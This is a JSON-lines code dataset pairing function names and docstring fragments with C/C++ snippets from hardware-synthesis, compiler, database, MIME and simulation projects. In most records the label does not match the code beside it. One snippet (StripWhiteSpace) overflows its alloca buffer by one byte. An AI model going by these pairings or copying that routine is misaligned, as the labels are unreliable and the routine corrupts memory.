value_demosaic_bx_demosaic_bx_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":2209}
{"content":"{'function_name': 'MimeOleCreateMessageTree', 'docstring': '\/\/ Done\\r', 'code': 'MIMEOLEAPI MimeOleCreatePropertySet(IUnknown *pUnkOuter, IMimePropertySet **ppPropertySet)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT             hr=S_OK;\\r\\n    LPMESSAGEBODY       pBody=NULL;\\r\\n\\r\\n    \/\/ check params\\r\\n    if (NULL == ppPropertySet)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ Init\\r\\n    *ppPropertySet = NULL;\\r\\n\\r\\n    \/\/ Allocate MimePropertySet\\r\\n    CHECKALLOC(pBody = new CMessageBody(NULL, pUnkOuter));\\r\\n\\r\\n    \/\/ Init New\\r\\n    CHECKHR(hr = pBody->InitNew());\\r\\n\\r\\n    \/\/ Success\\r\\n    *ppPropertySet = (IMimePropertySet *)pBody;\\r\\n    (*ppPropertySet)->AddRef();\\r\\n\\r\\nexit:\\r\\n    \/\/ Done\\r\\n    SafeRelease(pBody);\\r\\n\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}'}","id":2211}
{"content":"{'function_name': 'PerformXPathQuery', 'docstring': '\/* Cleanup *\/', 'code': 'QVector<QtXMLElement *> PerformHTMLXPathQuery(QByteArray *document, QString query)\\n{\\n    xmlDocPtr doc;\\n\\n    \/* Load XML document *\/\\n    doc = htmlReadMemory(document->data(), document->length(), \"\", \"\", HTML_PARSE_NOWARNING | HTML_PARSE_NOERROR);\\n\\n    if (doc == NULL)\\n    {\\n        throw \"Unable to parse.\";\\n        \/\/      NSLog(@\"Unable to parse.\");\\n\/\/        return result;\\n    }\\n\\n    QVector<QtXMLElement *> result = PerformXPathQuery(doc, query);\\n    xmlFreeDoc(doc);\\n\\n    return result;\\n}'}","id":2212}
{"content":"{'function_name': 'p_GeoDaWeight__GetMedianNeighbors', 'docstring': '\/\/ invoke the function', 'code': 'Rcpp::DataFrame p_GeoDaWeight__SpatialLag(SEXP xp, SEXP vals)\\n{\\n  \/\/ grab the object as a XPtr (smart pointer) to GeoDaWeight\\n  Rcpp::XPtr<GeoDaWeight> ptr(xp);\\n\\n  std::vector<double> _vals = as<std::vector<double> >(vals);\\n\\n  \/\/ invoke the function\\n  int num_obs = ptr->GetNumObs();\\n\\n  Rcpp::NumericVector lags;\\n  for (int i=0; i<num_obs; ++i) {\\n    lags.push_back(ptr->SpatialLag(i, _vals));\\n  }\\n\\n  Rcpp::DataFrame df = Rcpp::DataFrame::create(Rcpp::Named(\"Spatial Lag\") = lags);\\n  return df;\\n}'}","id":2213}
{"content":"{'function_name': 'TestJacobians', 'docstring': '\/\/TODO: the other jacobians (Jacobian_j, Jacobian_ij)', 'code': 'bool TestHessians(ScalarFieldFunction* f,Vector& x,Real h,Real atol,Real rtol)\\n{\\n  \/\/TODO: do testing\\n  return true;\\n}'}","id":2214}
{"content":"{'function_name': 'dense_reader_to_capnp', 'docstring': \"\/\/ If stats object exists set its cap'n proto object\", 'code': 'tdb_unique_ptr<ASTNode> condition_ast_from_capnp(\\n    const capnp::ASTNode::Reader& ast_reader) {\\n  if (!ast_reader.getIsExpression()) {\\n    \/\/ Getting and validating the field name.\\n    std::string field_name = ast_reader.getFieldName();\\n    ensure_qc_field_name_is_valid(field_name);\\n\\n    \/\/ Getting and validating the condition value.\\n    auto condition_value = ast_reader.getValue();\\n    const void* data =\\n        static_cast<const void*>(condition_value.asBytes().begin());\\n    size_t size = condition_value.size();\\n    ensure_qc_condition_value_is_valid(data, size);\\n\\n    \/\/ Getting and validating the condition offsets.\\n    const void* offsets = nullptr;\\n    size_t offsets_size = 0;\\n    if (ast_reader.hasOffsets()) {\\n      auto condition_offsets = ast_reader.getOffsets();\\n      offsets = static_cast<const void*>(condition_offsets.asBytes().begin());\\n      offsets_size = condition_offsets.size();\\n      ensure_qc_condition_value_is_valid(offsets, offsets_size);\\n    }\\n\\n    \/\/ Getting and validating the query condition operator.\\n    QueryConditionOp op = QueryConditionOp::LT;\\n    Status s = query_condition_op_enum(ast_reader.getOp(), &op);\\n    if (!s.ok()) {\\n      throw std::runtime_error(\\n          \"condition_ast_from_capnp: query_condition_op_enum failed.\");\\n    }\\n    ensure_qc_op_is_valid(op);\\n\\n    auto use_enumeration = ast_reader.getUseEnumeration();\\n\\n    if (op == QueryConditionOp::IN || op == QueryConditionOp::NOT_IN) {\\n      return tdb_unique_ptr<ASTNode>(tdb_new(\\n          ASTNodeVal,\\n          field_name,\\n          size == 0 ? nullptr : data,\\n          size,\\n          offsets,\\n          offsets_size,\\n          op,\\n          use_enumeration));\\n    }\\n\\n    return tdb_unique_ptr<ASTNode>(\\n        tdb_new(ASTNodeVal, field_name, data, size, op, use_enumeration));\\n  }\\n\\n  \/\/ Getting and validating the query condition combination operator.\\n  std::string combination_op_str = ast_reader.getCombinationOp();\\n  QueryConditionCombinationOp combination_op = QueryConditionCombinationOp::AND;\\n  Status s =\\n      query_condition_combination_op_enum(combination_op_str, &combination_op);\\n  if (!s.ok()) {\\n    throw std::runtime_error(\\n        \"condition_ast_from_capnp: query_condition_combination_op_enum \"\\n        \"failed.\");\\n  }\\n  ensure_qc_combo_op_is_valid(combination_op);\\n\\n  \/\/ We assume that the deserialized values of the child nodes are validated\\n  \/\/ properly.\\n  std::vector<tdb_unique_ptr<ASTNode>> ast_nodes;\\n  for (const auto child : ast_reader.getChildren()) {\\n    ast_nodes.push_back(condition_ast_from_capnp(child));\\n  }\\n  return tdb_unique_ptr<ASTNode>(\\n      tdb_new(ASTNodeExpr, std::move(ast_nodes), combination_op));\\n}'}","id":2216}
{"content":"{'function_name': 'translateNameInDNS', 'docstring': '\/* \u5c06\u57df\u540d\u6574\u4f53\u5411\u524d\u79fb1\u4f4d *\/', 'code': \"CString translateNameInDNS(const char *name)\\n{\\n\\tCString strName(name);\\n\\tbool canMove = false;\\n\\n\\tif (!isalnum(strName.GetAt(0)) && strName.GetAt(0) != '-')\\n\\t{\\n\\t\\tcanMove = true;\\n\\t}\\n\\t\/* \u5c06\u8ba1\u6570\u8f6c\u6362\u4e3a'.' *\/\\n\\tfor (int i = 0; i < strName.GetLength(); ++i)\\n\\t{\\n\\t\\tif (!isalnum(strName.GetAt(i)) && strName.GetAt(i) != '-')\\n\\t\\t{\\n\\t\\t\\tstrName.SetAt(i, '.');\\n\\t\\t}\\n\\t}\\n\\n\\t\/* \u5c06\u57df\u540d\u6574\u4f53\u5411\u524d\u79fb1\u4f4d *\/\\n\\tif (canMove)\\n\\t{\\n\\t\\tfor (int i = 0; i<strName.GetLength(); ++i)\\n\\t\\t{\\n\\t\\t\\tstrName.SetAt(i, strName.GetAt(i + 1));\\n\\t\\t}\\n\\t}\\n\\treturn strName;\\n}\"}","id":2217}
{"content":"{'function_name': 'convertTo', 'docstring': '\/\/ Converter y', 'code': 'cv::Point2f convertTof(Scale origin, Scale destiny, cv::Point2f point) {\\n\\n\\tcv::Point2f converted_point;\\n\\n\\tfloat width_origin, width_destiny;\\n\\tfloat height_origin, height_destiny;\\n\\n\\t\/\/ Converter x\\n\\twidth_origin = origin.upper_limit.x - origin.lower_limit.x;\\n\\twidth_destiny = destiny.upper_limit.x - destiny.lower_limit.x;\\n\\n\\tconverted_point.x = (width_destiny * (((point.x - origin.lower_limit.x) \/ width_origin)) + destiny.lower_limit.x);\\n\\n\\t\/\/ Converter y\\n\\theight_origin = origin.upper_limit.y - origin.lower_limit.y;\\n\\theight_destiny = destiny.upper_limit.y - destiny.lower_limit.y;\\n\\n\\tconverted_point.y = (height_destiny * (((point.y - origin.lower_limit.y) \/ height_origin)) + destiny.lower_limit.y);\\n\\n\\treturn converted_point;\\n}'}","id":2218}
{"content":"{'function_name': 'DCCDisp_CstBinMems', 'docstring': '\/* TODO: Extended-length constant arithmetic. *\/', 'code': 'PUBLIC void\\nDCCDisp_CstBinMem(tok_t op,\\n                  struct DCCSymAddr const *__restrict val,\\n                  struct DCCMemLoc  const *__restrict dst,\\n                  width_t width, int src_unsigned) {\\n struct binary_operator const *bin_op = bin_ops;\\n assert(CHECK_WIDTH(width));\\n while (bin_op->bo_tok && bin_op->bo_tok != op) ++bin_op;\\n if (!bin_op->bo_tok) {\\n  switch (op) {\\n  case \\'=\\': DCCDisp_CstMovMem(val,dst,width); break;\\n  {\\n   rc_t temp;\\n  case \\'*\\':\\n   temp = DCCVStack_GetReg(width == 4 ? DCC_RC_I32 : DCC_RC_I16,width != 1);\\n   assertf(width != 1 || temp&DCC_RC_I8,\"Must always be the case for non-pointer classes.\");\\n   if (width == 1) {\\n    DCCDisp_IntMovReg(0,temp);\\n    DCCDisp_MemMovReg(dst,temp&~(DCC_RC_I16));\\n    DCCDisp_CstBinReg(op,val,temp,src_unsigned);\\n    temp &= ~(DCC_RC_I16);\\n   } else {\\n    \/* imulw\/l $imm8\/16\/32, offset(%dst), %temp *\/\\n    DCCDisp_ProbeSym(val,1);\\n    DCCDisp_X86Segp(dst->ml_reg);\\n    if (width == 2) t_putb(0x66);\\n    if (!val->sa_sym && val->sa_off == (int8_t)val->sa_off) t_putb(0x6b),width = 1;\\n    else                                                    t_putb(0x69);\\n    \/* NOTE: Operands must be written reverse of the usual order. *\/\\n    asm_modmem(temp&DCC_RI_MASK,dst);\\n    DCCDisp_SymAddr(val,width);\\n   }\\n   \/* Store the multiplication result. *\/\\n   DCCDisp_RegMovMem(temp,dst);\\n  } break;\\n\\n  { \/* Divide\/Modulo *\/\\n   rc_t temp;\\n  case \\'\/\\':\\n  case \\'%\\':\\n   \/* Allocate a temporary register for the source constant.\\n    * NOTE: Make sure not to allocate the destination register,\\n    *       or the fixed registers that will be required for the opcode.\\n    *\/\\n#ifdef IA32_PROTECTED_REGISTERS\\n   if (dst->ml_reg != DCC_RC_CONST &&\\n      (dst->ml_reg&DCC_RI_MASK) == DCC_ASMREG_ECX) {\\n    \/* Since \\'EBX\\' is protected, ECX is the only register we could use.\\n     * But as it turns out, that one\\'s already in use by the destination.\\n     * >> Now we have to push\/pop EBX... *\/\\n    temp = DCC_RC_FORSIZE(width)|DCC_ASMREG_EBX;\\n    DCCDisp_RegPush(temp);\\n    DCCDisp_CstMovReg(val,temp);\\n    DCCDisp_RegBinMem(op,temp,dst,src_unsigned);\\n    DCCDisp_PopReg(temp);\\n   } else\\n#endif\\n   {\\n    temp = DCCVStack_GetRegOf(DCC_RC_FORSIZE(width),\\n                            ~((1 << DCC_ASMREG_EAX)|\\n                              (1 << DCC_ASMREG_EDX)|\\n                              (dst->ml_reg != DCC_RC_CONST ? (1 << (dst->ml_reg&7)) : 0)\\n                             ));\\n    DCCDisp_CstMovReg(val,temp);\\n    DCCDisp_RegBinMem(op,temp,dst,src_unsigned);\\n   }\\n   break;\\n  }\\n\\n  { \/* Shift operations. *\/\\n  case TOK_SHL:\\n  case TOK_SHR:\\n  case TOK_RANGLE3:\\n   \/* Generate the shift instruction. *\/\\n   DCCDisp_ProbeSym(val,1);\\n   DCCDisp_X86Segp(dst->ml_reg);\\n   if (width == 2) t_putb(0x66);\\n   if (!val->sa_sym && val->sa_off == 1) {\\n    \/* Shift by 1. *\/\\n    t_putb(0xd0+(width >= 2));\\n    asm_modmem(get_shift_group(op),dst);\\n   } else {\\n    t_putb(0xc0+(width >= 2));\\n    asm_modmem(get_shift_group(op),dst);\\n    DCCDisp_SymAddr8(val);\\n   }\\n  } break;\\n\\n  { \/* test *\/\\n  case \\'t\\':\\n   DCCDisp_ProbeSym(val,1);\\n   DCCDisp_X86Segp(dst->ml_reg);\\n   if (width == 2) t_putb(0x66);\\n   t_putb(0xf6+(width >= 2));\\n   asm_modmem(0,dst);\\n   DCCDisp_SymAddr(val,width);\\n  } break;\\n\\n  default: break;\\n  }\\n  return;\\n }\\n \/* *op symaddr, offset(%dst) *\/\\n DCCDisp_ProbeSym(val,1);\\n DCCDisp_X86Segp(dst->ml_reg);\\n if (width == 2) t_putb(0x66);\\n if (width == 1) {\\n  \/* 8-bit immediate value. *\/\\n  t_putb(0x80);\\n } else if (!val->sa_sym && val->sa_off == (int8_t)val->sa_off) {\\n  \/* 7-bit immediate value. *\/\\n  t_putb(0x83);\\n  width = 1;\\n } else {\\n  \/* 16\/32-bit immediate value. *\/\\n  t_putb(0x81);\\n }\\n asm_modmem(bin_op->bo_im_grp,dst);\\n DCCDisp_SymAddr(val,width);\\n}'}","id":2223}
{"content":"{'function_name': 'MimeOleSetPropW', 'docstring': '\/\/ Call Method\\r', 'code': 'MIMEOLEAPI MimeOleGetBodyPropA(\\r\\n                               IMimeMessageTree   *pTree,\\r\\n                               HBODY               hBody,\\r\\n                               LPCSTR              pszName,\\r\\n                               DWORD               dwFlags,\\r\\n                               LPSTR              *ppszData)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT     hr=S_OK;\\r\\n\\r\\n    \/\/ Invaid Arg\\r\\n    if (NULL == pTree)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ Initialzie PropVariant\\r\\n    PROPVARIANT rVariant;\\r\\n    rVariant.vt = VT_LPSTR;\\r\\n\\r\\n    \/\/ Call Method\\r\\n    CHECKHR(hr = pTree->GetBodyProp(hBody, pszName, dwFlags, &rVariant));\\r\\n\\r\\n    \/\/ Return the Data\\r\\n    *ppszData = rVariant.pszVal;\\r\\n\\r\\nexit:\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}'}","id":2229}
{"content":"{'function_name': 'LambEval', 'docstring': '\/\/\u6700\u591a\u53ef\u80fd\u7684\u8f6c\u79fb\u5708\u6570', 'code': 'void coe2ee(int&flag, double* ee, const double* coe, double mu)\\n{\\n\\tflag=0;\\n\\tif(mu<=0.0||coe[0]<0.0||coe[1]<0.0||coe[2]<0.0||coe[2]>DPI)\\t\\n\\t\\treturn;\\t\\n\\tif((coe[1]*cos(coe[5]))<-1.0)\\n\\t\/\/\\t\\tcout<<\"\u4e0d\u53ef\u80fd\u8fbe\u5230\u7684\u53cc\u66f2\u8f68\u9053.\"<<endl;\\n\\t\\treturn;\\n\\t\\n\\tee[0]=coe[0]*fabs(1.0-coe[1]*coe[1]);\/\/\u534a\u901a\u5f84p\\n\\tif(coe[1]==1.0)\/\/\u5982\u679c\u662f\u629b\u7269\u7ebf\u8f68\u9053,\u533a\u522b\u5bf9\u5f85.\\n\\t\\tee[0]=2.0*coe[0];\\n\\tee[1]=coe[1]*cos(coe[4]+coe[3]);\/\/f\\n\\tee[2]=coe[1]*sin(coe[4]+coe[3]);\/\/g\\n\\tdouble temp=tan(coe[2]\/2.0);\\n\\tee[3]=temp*cos(coe[3]);\/\/h\\n\\tee[4]=temp*sin(coe[3]);\/\/k\\n\\tee[5]=coe[4]+coe[3]+coe[5];\\n\\tee[5]=fmod(ee[5],D2PI);\\n\\tif(ee[5]<0.0)\\n\\t\\tee[5]+=D2PI;\\n\\tflag=1;\\n\\treturn ;\\n}'}","id":2231}
{"content":"{'function_name': 'TestSmtpCB', 'docstring': '\/\/ test to see if there is enough to stand a chance to test ok', 'code': 'static void StripWhiteSpace(Fl_Input *o)\\n{\\n  char *str_end;\\n  char *str = alloca(strlen(o->value()));\\n  if(str == NULL)\\n    return;\\n  char *ptr = str;\\n  int c;\\n  strcpy(str, o->value());\\n  \/\/ Trim leading space\\n  while(isspace(*str))\\n    str++;\\n  if(*str == 0)  \/\/ All spaces?\\n  {\\n    o->value(\"\");\\n    return;\\n  }\\n  \/\/ Trim trailing space\\n  str_end = str + strlen(str) - 1;\\n  while(str_end > str && isspace(*str_end))\\n    str_end--;\\n  \/\/ Write new null terminator\\n  *(str_end + 1) = 0;\\n  o->value(str);\\n}'}","id":2232}
{"content":"{'function_name': 'denoiseb_rd21_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd22_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd22 read pattern: { denoiseb_update_0[d0, d1] -> raw[2 + 2d0, d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 1930 : -1 <= d0 <= 960 and -1 <= d1 <= 1082; denoiseb_update_0[d0, d1] -> (969 + d0) : d0 = 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write0 = raw.raw_raw_update_0_write0_merged_banks_25.peek_1930();\\n  return value_raw_raw_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":2239}
{"content":"{'function_name': 'CalcCutPath2DLeadIn', 'docstring': '\/\/ \u7136\u540e\u8ba1\u7b97\u5207\u5165\u5207\u51fa', 'code': 'void CalcCutPath2DLeadOut( CSmtCheckMdl &CheckMdl, JDNC_TOL &cTol, JDNC_CONNECT3D &cConnect, \\n\\t\\t\\t\\t\\t\\tCSmtCutPath *pPath, CSmtCutPath *&LeadOut, BOOL bCheck )\\n{\\n\\t\/\/ \u9996\u5148\u5f97\u5230\u53c2\u6570\\n\\tint i = 0 ;\\n\\tFPNT3D pnt, tan, nor = { 0, 0, 1 } ;\\n\\tVEC3D vec ;\\n\\tmathFCpyPnt( pPath->m_pTail->m_fPoint, pnt ) ;\\n\\tif( bCheck )\\n\\t\\tMathCAM_DefineNormalAt( CheckMdl, cTol, pnt, nor ) ;\\n\\telse\\n\\t{\\n\\t\\tfor( i = 0 ; i < 3 ; i++ )\\n\\t\\t\\tnor[i] = ( ( CSmtCutPointEx *)pPath->m_pTail )->m_fSurfNor[i] ; \\n\\t}\\n\\n\\tif( !nc_Normalize( nor, 3 ) )\\n\\t{\\n\\t\\tif( !bCheck )\\n\\t\\t{\\n\\t\\t\\tCSmtCutPointEx *pTail = ( CSmtCutPointEx *)pPath->m_pTail ;\\n\\t\\t\\tmathFCpyPnt( pTail->m_fSurfNor, nor ) ;\\n\\t\\t\\tnor[2] = 0. ;\\n\\t\\t\\tif( !nc_Normalize( nor, 3 ) )\\n\\t\\t\\t{\\n\\t\\t\\t\\tnor[0] = nor[1] = 0.f, nor[2] = 1.f ;\\n\\t\\t\\t}\\n\\t\\t}\\n\\t\\telse\\n\\t\\t{\\n\\t\\t\\tnor[0] = nor[1] = 0.f, nor[2] = 1.f ;\\n\\t\\t}\\n\\t} \\t\\n\\tFPNT4D start, end;\\n\\tfor (int j = 0; j < 4; j++)\\n\\t{\\n\\t\\tstart[j] = pPath->m_pTail->m_fPoint[j];\\n\\t\\tend[j] = pPath->m_pTail->prev->m_fPoint[j];\\n\\t}\\n\\tend[2] = start[2];\\n\\tmathFGetUnitVec( end, start, vec ) ;\\n\\n\\tfor( i = 0 ; i < 3 ; i++ )\\n\\t{\\n\\t\\ttan[i] = TFLOAT( vec[i] ) ;\\n\\t}\\n\\n\\t\/\/ \u7136\u540e\u8ba1\u7b97\u5207\u5165\u5207\u51fa\\n\\tCSmtCutPath tmpLead( MINI_CONNECT_PATH ) ;\\n\\n\\tif (!(nor[0] < 0.01 && nor[1] < 0.01))\\n\\t{\\n\\t\\tnor[2] = 0.;\\n\\t}\\n\\tif( !MathCAM_GenLeadPathEx( CheckMdl, cTol, cConnect, \\n\\t\\tpnt, tan, nor, tmpLead, bCheck ) )\\n\\t{\\n\\t\\treturn ;\\n\\t}\\n\\t\\n\\tLeadOut = new CSmtCutPath( MINI_CONNECT_PATH ) ;\\n\\tLeadOut->m_bFeedType = JDNC_FEEDTYPE_LEAD ;\\n\\tLeadOut->AppendCutPoint ( tmpLead.m_pHead ) ;\\n\\tLeadOut->DefineBox () ;\\n\\n\\ttmpLead.m_pHead = tmpLead.m_pTail = NULL ;\\n\\ttmpLead.ClearAllPoint () ;\\n}'}","id":2242}
{"content":"{'function_name': 'pci_write', 'docstring': '\/\/ No spanning allowed', 'code': 'static bool pci_is_valid_index_bar(size_t index, size_t bar)\\n{\\n    \/\/ If reading out of range device or bar, not valid\\n    if (index >= device_count || bar >= 5)\\n        return false;\\n    \\n    pci_device_summary_t const &dev = devices[index];\\n    \\n    \/\/ If reading high half of a 64 bit bar directly, not valid\\n    if (bar > 0 && pci_raw_bar_is_64(dev.bars[bar - 1]))\\n        return false;\\n    \\n    return true;\\n}'}","id":2244}
{"content":"{'function_name': 'apply', 'docstring': '\/\/ Use the same apply_dispatch than the normal apply otherwise', 'code': 'HPX_FORCEINLINE decltype(auto) async(Executor&& exec,\\n        hpx::sycl::experimental::sycl_executor::queue_function_code_loc_ptr_t<\\n            Ts>&& f,\\n        Ts&& ts)\\n    {\\n        \/\/ Make sure we only use this for sycl executors\\n        static_assert(std::is_same<std::decay_t<Executor>,\\n            hpx::sycl::experimental::sycl_executor>::value);\\n        \/\/ Use the same async_dispatch than the normal async otherwise\\n        return detail::async_dispatch<\\n            typename std::decay<Executor>::type>::call(HPX_FORWARD(Executor,\\n                                                           exec),\\n            HPX_FORWARD(hpx::sycl::experimental::sycl_executor::\\n                            queue_function_code_loc_ptr_t<Ts>,\\n                f),\\n            HPX_FORWARD(Ts, ts));\\n    }'}","id":2254}
{"content":"{'function_name': 'popDRAMQ', 'docstring': '\/\/ Reset popWhenReady', 'code': 'bool checkQAndRespond(int id) {\\n  \/\/ If request at front has completed, pop and poke DRAM response\\n  bool pokedResponse = false;\\n  if (dramRequestQ[id].size() > 0) {\\n    DRAMRequest *req = dramRequestQ[id].front();\\n\\n\/\/    if (useIdealDRAM) {\\n\/\/      req->elapsed++;\\n\/\/      if (req->elapsed >= req->delay) {\\n\/\/        req->completed = true;\\n\/\/        if (debug) {\\n\/\/          EPRINTF(\"[idealDRAM txComplete] addr = %p, tag = %lx, finished = %lu\\\\n\", (void*)req->addr, req->tag, numCycles);\\n\/\/        }\\n\/\/      }\\n\/\/    }\\n\\n    if (req->completed) {\\n      uint8_t rdata[64] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};\\n      bool pokeResponse = false;\\n\\n      if (req->isWr) { \/\/ Write request: Update 1 burst-length bytes at *addr\\n        uint8_t *wdata = req->wdata;\\n        uint8_t *waddr = (uint8_t*) req->addr;\\n        for (int i=0; i<burstSizeWords; i++) {\\n          waddr[i] = wdata[i];\\n        }\\n        if (req->cmd->hasCompleted()) {\\n          pokeResponse = true;\\n        }\\n      } else { \/\/ Read request: Read burst-length bytes at *addr\\n        uint8_t *raddr = (uint8_t*) req->addr;\\n        for (int i=0; i<burstSizeWords; i++) {\\n          rdata[i] = raddr[i];\\n        }\\n        pokeResponse = true;\\n      }\\n\\n      if (pokeResponse) { \/\/ Send DRAM response\\n        if (debug) {\\n          EPRINTF(\"[Sending DRAM resp to]: \");\\n          req->print();\\n        }\\n\\n      \/\/ N3Xt logging info\\n      fprintf(traceFp, \"id: %lu\\\\n\", req->id);\\n      fprintf(traceFp, \"issue: %lu\\\\n\", req->issued);\\n      if (req->isWr) {\\n        fprintf(traceFp, \"type: STORE\\\\n\");\\n      } else {\\n        fprintf(traceFp, \"type: LOAD\\\\n\");\\n      }\\n      fprintf(traceFp, \"delay: %d\\\\n\", numCycles - req->issued);\\n      fprintf(traceFp, \"addr: %lu\\\\n\", req->smallAddr);\\n      fprintf(traceFp, \"size: %u\\\\n\", burstSizeBytes);\\n      fprintf(traceFp, \"channel: %d\\\\n\", req->channelID);\\n      fprintf(traceFp, \"\\\\n\");\\n\\n\\n        if (req->isWr) {\\n          pokeDRAMWriteResponse(req->tag.uid, req->tag.streamId);\\n        } else {\\n          pokeDRAMReadResponse(\\n            req->tag.uid,\\n            req->tag.streamId,\\n            rdata[0],\\n            rdata[1],\\n            rdata[2],\\n            rdata[3],\\n            rdata[4],\\n            rdata[5],\\n            rdata[6],\\n            rdata[7],\\n            rdata[8],\\n            rdata[9],\\n            rdata[10],\\n            rdata[11],\\n            rdata[12],\\n            rdata[13],\\n            rdata[14],\\n            rdata[15],\\n            rdata[16],\\n            rdata[17],\\n            rdata[18],\\n            rdata[19],\\n            rdata[20],\\n            rdata[21],\\n            rdata[22],\\n            rdata[23],\\n            rdata[24],\\n            rdata[25],\\n            rdata[26],\\n            rdata[27],\\n            rdata[28],\\n            rdata[29],\\n            rdata[30],\\n            rdata[31],\\n            rdata[32],\\n            rdata[33],\\n            rdata[34],\\n            rdata[35],\\n            rdata[36],\\n            rdata[37],\\n            rdata[38],\\n            rdata[39],\\n            rdata[40],\\n            rdata[41],\\n            rdata[42],\\n            rdata[43],\\n            rdata[44],\\n            rdata[45],\\n            rdata[46],\\n            rdata[47],\\n            rdata[48],\\n            rdata[49],\\n            rdata[50],\\n            rdata[51],\\n            rdata[52],\\n            rdata[53],\\n            rdata[54],\\n            rdata[55],\\n            rdata[56],\\n            rdata[57],\\n            rdata[58],\\n            rdata[59],\\n            rdata[60],\\n            rdata[61],\\n            rdata[62],\\n            rdata[63]\\n\\n          );\\n        }\\n        pokedResponse = true;\\n      }\\n    }\\n  }\\n  return pokedResponse;\\n}'}","id":2263}
{"content":"{'function_name': 'pdmR3ThreadMain', 'docstring': '\/*\\n     * Advance the state to terminating and then on to terminated.\\n     *\/', 'code': 'PDMR3ThreadSuspend(PPDMTHREAD pThread)\\n{\\n    \/*\\n     * Assert sanity.\\n     *\/\\n    AssertPtrReturn(pThread, VERR_INVALID_POINTER);\\n    AssertReturn(pThread->u32Version == PDMTHREAD_VERSION, VERR_INVALID_MAGIC);\\n    Assert(pThread->Thread != RTThreadSelf());\\n\\n    \/*\\n     * This is a noop if the thread is already suspended.\\n     *\/\\n    if (pThread->enmState == PDMTHREADSTATE_SUSPENDED)\\n        return VINF_SUCCESS;\\n\\n    \/*\\n     * Change the state to resuming and kick the thread.\\n     *\/\\n    int rc = RTSemEventMultiReset(pThread->Internal.s.BlockEvent);\\n    if (RT_SUCCESS(rc))\\n    {\\n        rc = RTThreadUserReset(pThread->Thread);\\n        if (RT_SUCCESS(rc))\\n        {\\n            rc = VERR_WRONG_ORDER;\\n            if (pdmR3AtomicCmpXchgState(pThread, PDMTHREADSTATE_SUSPENDING, PDMTHREADSTATE_RUNNING))\\n            {\\n                rc = pdmR3ThreadWakeUp(pThread);\\n                if (RT_SUCCESS(rc))\\n                {\\n                    \/*\\n                     * Wait for the thread to reach the suspended state.\\n                     *\/\\n                    if (pThread->enmState != PDMTHREADSTATE_SUSPENDED)\\n                        rc = RTThreadUserWait(pThread->Thread, 60*1000);\\n                    if (    RT_SUCCESS(rc)\\n                        &&  pThread->enmState != PDMTHREADSTATE_SUSPENDED)\\n                        rc = VERR_PDM_THREAD_IPE_2;\\n                    if (RT_SUCCESS(rc))\\n                        return rc;\\n                }\\n            }\\n        }\\n    }\\n\\n    \/*\\n     * Something failed, initialize termination.\\n     *\/\\n    AssertMsgFailed((\"PDMR3ThreadSuspend -> rc=%Rrc enmState=%d suspending \\'%s\\'\\\\n\",\\n                     rc, pThread->enmState, RTThreadGetName(pThread->Thread)));\\n    pdmR3ThreadBailOut(pThread);\\n    return rc;\\n}'}","id":2265}
{"content":"{'function_name': 'tcp', 'docstring': '\/\/ Run asynchronous wait handler in its own thread', 'code': 'cSocket() : myWindow(maker::make()),\\n                    myTCP(&myWindow),\\n                    myConnectHandler([](std::string port) {})\\n        {\\n            \/\/  when a client connects, setup to read anything sent\\n            myWindow.events()\\n                .tcpServerAccept(\\n                    [this]\\n                    {\\n                        myConnectHandler(myPort);\\n                        myTCP.read();\\n                    });\\n\\n            \/\/  handle data received on input\\n            myWindow.events().tcpRead(\\n                [this]\\n                {\\n                    \/\/ check for connection closed\\n                    if (!myTCP.isConnected())\\n                    {\\n                        if (myIpaddr.empty())\\n                        {\\n                            \/\/ client disconnect\\n                            std::cout << \"Input Connection closed, waiting for new client\\\\n\";\\n\\n                            server(\\n                                myPort,\\n                                myConnectHandler,\\n                                myReadHandler);\\n                        }\\n                        else\\n                        {\\n                            \/\/ server disconnected\\n                            std::cout << \"server disconnected\\\\n\";\\n                        }\\n                        return;\\n                    }\\n\\n                    myReadHandler(\\n                        myPort,\\n                        myTCP.readMsg());\\n\\n                    \/\/ setup for next message\\n                    myTCP.read();\\n                });\\n        }'}","id":2267}
